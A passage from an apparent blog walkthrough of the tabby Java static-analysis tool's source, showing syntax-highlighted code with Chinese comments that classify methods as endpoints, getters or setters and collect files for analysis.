class="token punctuation">;</span>                methodRef<span class="token punctuation">.</span><span class="token function">setPollutedPosition</span><span class="token punctuation">(</span>polluted<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">?</span>polluted<span class="token operator">:</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                methodRef<span class="token punctuation">.</span><span class="token function">setActionInitialed</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>isIgnore<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 不构建ignore的类型</span>                    methodRef<span class="token punctuation">.</span><span class="token function">setInitialed</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setSink</span><span class="token punctuation">(</span>isSink<span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setIgnore</span><span class="token punctuation">(</span>isIgnore<span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setSource</span><span class="token punctuation">(</span>isSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setEndpoint</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">isStrutsAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isEndpoint</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> relatedClassnames<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setNettyEndpoint</span><span class="token punctuation">(</span><span class="token function">isNettyEndpoint</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> relatedClassnames<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setGetter</span><span class="token punctuation">(</span><span class="token function">isGetter</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setSetter</span><span class="token punctuation">(</span><span class="token function">isSetter</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setSerializable</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.io.Serializable"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setAbstract</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setHasDefaultConstructor</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">isHasDefaultConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodRef<span class="token punctuation">.</span><span class="token function">setFromAbstractClass</span><span class="token punctuation">(</span>ref<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Has</span> has <span class="token operator">=</span> <span class="token class-name">Has</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> methodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">getHasEdge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">store</span><span class="token punctuation">(</span>has<span class="token punctuation">)</span><span class="token punctuation">;</span>        dataContainer<span class="token punctuation">.</span><span class="token function">store</span><span class="token punctuation">(</span>methodRef<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * check method is an endpoint     * @param method     * @param relatedClassnames     * @return     */</span>    <span class="token comment">// isEndpoint() 方法首先检查方法名是否是 HTTP 请求处理方法的常见名称，例如 doGet()、doPost() 等。如果是，则认为该方法是 HTTP 请求处理方法。</span>    <span class="token comment">// 如果方法名不符合常见名称，则会进一步检查方法的返回值是否是 void，参数个数是否为 0。如果是，则认为该方法是 HTTP 请求处理方法。</span>    <span class="token comment">// 此外，isEndpoint() 方法还会检查方法是否包含 javax.servlet.Mapping 注解，或者方法所属类是否实现了 javax.servlet.Servlet 接口。如果满足这些条件，则认为该方法是 HTTP 请求处理方法。    </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isEndpoint</span><span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> relatedClassnames<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// check jsp _jspService</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"_jspService"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// check from annotation</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Tag</span><span class="token punctuation">></span></span> tags <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Tag</span> tag <span class="token operator">:</span> tags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tag <span class="token keyword">instanceof</span> <span class="token class-name">VisibilityAnnotationTag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">VisibilityAnnotationTag</span> visibilityAnnotationTag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">VisibilityAnnotationTag</span><span class="token punctuation">)</span> tag<span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">AnnotationTag</span> annotationTag <span class="token operator">:</span> visibilityAnnotationTag<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> type <span class="token operator">=</span> annotationTag<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"Mapping;"</span><span class="token punctuation">)</span>                            <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"javax/ws/rs/Path;"</span><span class="token punctuation">)</span>                            <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"javax/ws/rs/GET;"</span><span class="token punctuation">)</span>                            <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"javax/ws/rs/PUT;"</span><span class="token punctuation">)</span>                            <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"javax/ws/rs/DELETE;"</span><span class="token punctuation">)</span>                            <span class="token operator">||</span> type<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"javax/ws/rs/POST;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// https://blog.csdn.net/melissa_heixiu/article/details/52472450</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> requestTypes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>                <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"doGet"</span><span class="token punctuation">,</span><span class="token string">"doPost"</span><span class="token punctuation">,</span><span class="token string">"doPut"</span><span class="token punctuation">,</span><span class="token string">"doDelete"</span><span class="token punctuation">,</span><span class="token string">"doHead"</span><span class="token punctuation">,</span><span class="token string">"doOptions"</span><span class="token punctuation">,</span><span class="token string">"doTrace"</span><span class="token punctuation">,</span><span class="token string">"service"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// check from servlet</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.Servlet"</span><span class="token punctuation">)</span>                <span class="token operator">||</span> relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.http.HttpServlet"</span><span class="token punctuation">)</span> <span class="token comment">// 防止依赖缺失情况下的识别</span>                <span class="token operator">||</span> relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.GenericServlet"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> requestTypes<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// not an endpoint</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 判断方法是否是 Netty（Netty 框架中用于处理 HTTP 请求的方法）  请求处理方法的。 </span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isNettyEndpoint</span><span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> relatedClassnames<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> classname <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"io.netty.channel.ChannelInboundHandler"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span>                <span class="token operator">||</span> <span class="token string">"io.netty.handler.codec.ByteToMessageDecoder"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>classname<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// check from ChannelInboundHandler</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> nettyReadMethods <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"channelRead"</span><span class="token punctuation">,</span> <span class="token string">"channelRead0"</span><span class="token punctuation">,</span> <span class="token string">"messageReceived"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"io.netty.channel.ChannelInboundHandler"</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> nettyReadMethods<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// check from io.netty.handler.codec.ByteToMessageDecoder</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>relatedClassnames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"io.netty.handler.codec.ByteToMessageDecoder"</span><span class="token punctuation">)</span>                <span class="token operator">&amp;&amp;</span> <span class="token string">"decode"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// not an endpoint</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// getter 方法是 Java 语言中用于获取对象属性值的方法</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isGetter</span><span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> returnType <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> noParameter <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getParameterCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> isPublic <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>noParameter <span class="token operator">||</span> <span class="token operator">!</span>isPublic<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token string">"void"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"is"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"boolean"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// setter 方法是 Java 语言中用于设置对象属性值的方法</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isSetter</span><span class="token punctuation">(</span><span class="token class-name">SootMethod</span> method<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> returnType <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> singleParameter <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getParameterCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> isPublic <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>isPublic <span class="token operator">||</span> <span class="token operator">!</span>singleParameter<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> methodName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"void"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>returnType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// getAllFatherNodes() 方法用于获取类的所有父类和接口。</span>    <span class="token comment">// 该方法首先获取类的父类，然后递归调用该方法来获取父类的所有父类和接口</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">getAllFatherNodes</span><span class="token punctuation">(</span><span class="token class-name">SootClass</span> cls<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">hasSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>cls<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.Object"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            nodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            nodes<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token function">getAllFatherNodes</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getInterfaceCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            cls<span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>intface <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                nodes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>intface<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                nodes<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token function">getAllFatherNodes</span><span class="token punctuation">(</span>intface<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> nodes<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbycorecollectorfilecollector.java">tabby/core/collector/FileCollector.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>collector</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Path</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">GlobalConfiguration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>core<span class="token punctuation">.</span>data<span class="token punctuation">.</span></span><span class="token class-name">FileLocation</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">FileUtils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">tabby<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">JavaVersion</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3p1g * @since 2022/12/18 */</span><span class="token annotation punctuation">@Service</span><span class="token comment">// 该类用于收集待分析的文件或依赖库。</span><span class="token comment">// collect() 方法用于收集指定路径下的所有文件或依赖库。该方法首先将指定路径转换为绝对路径，然后使用 FileLocation 类来解析路径。</span><span class="token comment">// FileLocation 类用于解析文件或依赖库的路径。该类提供了 resolve() 方法来将路径解析为一个集合，其中每个元素是一个文件或依赖库的路径。</span><span class="token comment">// collect() 方法遍历 FileLocation 类解析出的集合，并将每个文件或依赖库的路径和 MD5 值存储到一个 Map 中。</span><span class="token comment">// collectJdkDependencies() 方法用于收集 JDK 的所有依赖库。该方法首先获取 JDK 的 home 目录，然后根据 JDK 的版本来选择不同的收集方法。</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileCollector</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">String</span> targetPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> allTargets <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Invalid target path: "</span> <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">FileLocation</span> location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileLocation</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> cps <span class="token operator">=</span> location<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> cp<span class="token operator">:</span>cps<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Path</span> temp <span class="token operator">=</span> <span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">isDirectory</span><span class="token 